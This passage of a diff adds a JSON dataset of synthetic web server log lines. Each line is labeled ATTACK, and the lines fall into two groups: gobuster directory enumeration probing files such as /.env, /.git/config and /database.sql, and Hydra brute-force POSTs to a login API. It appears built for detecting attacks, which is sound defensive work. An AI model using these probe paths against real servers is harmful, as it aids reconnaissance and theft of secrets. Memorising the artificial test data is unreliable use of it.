+    "raw": "198.51.100.99 - - [01/Jun/2026:11:00:30 +0000] \"GET /backup.zip HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:00:32 +0000] \"GET /phpmyadmin HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:00:34 +0000] \"GET /config.php.bak HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:00:36 +0000] \"GET /server-status HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:00:38 +0000] \"GET /database.sql HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:00:40 +0000] \"GET /.git/config HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:00:42 +0000] \"GET /.env HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:00:44 +0000] \"GET /.htaccess HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:00:46 +0000] \"GET /admin HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:00:48 +0000] \"GET /wp-admin HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:00:50 +0000] \"GET /backup.zip HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:00:52 +0000] \"GET /phpmyadmin HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:00:54 +0000] \"GET /config.php.bak HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:00:56 +0000] \"GET /server-status HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:00:58 +0000] \"GET /database.sql HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:01:00 +0000] \"GET /.git/config HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:01:02 +0000] \"GET /.env HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:01:04 +0000] \"GET /.htaccess HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:01:06 +0000] \"GET /admin HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:01:08 +0000] \"GET /wp-admin HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:01:10 +0000] \"GET /backup.zip HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:01:12 +0000] \"GET /phpmyadmin HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:01:14 +0000] \"GET /config.php.bak HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:01:16 +0000] \"GET /server-status HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:01:18 +0000] \"GET /database.sql HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:01:20 +0000] \"GET /.git/config HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:01:22 +0000] \"GET /.env HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:01:24 +0000] \"GET /.htaccess HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:01:26 +0000] \"GET /admin HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:01:28 +0000] \"GET /wp-admin HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:01:30 +0000] \"GET /backup.zip HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:01:32 +0000] \"GET /phpmyadmin HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:01:34 +0000] \"GET /config.php.bak HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:01:36 +0000] \"GET /server-status HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "198.51.100.99 - - [01/Jun/2026:11:01:38 +0000] \"GET /database.sql HTTP/1.1\" 404 128 \"-\" \"gobuster/3.1.0\"",
+    "label": "ATTACK",
+    "category": "dir_enum"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:00 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:01 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:02 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:03 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:04 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:05 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:06 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:07 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:08 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:09 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:10 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:11 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:12 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:13 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:14 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:15 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:16 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:17 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:18 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:19 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:20 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:21 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:22 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:23 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:24 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:25 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:26 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:27 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:28 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:29 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:30 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:31 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:32 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:33 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:34 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:35 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:36 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:37 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:38 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:39 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:40 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:41 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:42 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:43 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:44 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:45 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:46 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:47 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:48 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  },
+  {
+    "raw": "203.0.113.88 - - [01/Jun/2026:11:10:49 +0000] \"POST /api/v1/auth/login HTTP/1.1\" 401 128 \"-\" \"Hydra/9.2\"",
+    "label": "ATTACK",
+    "category": "brute_force"
+  }
+]
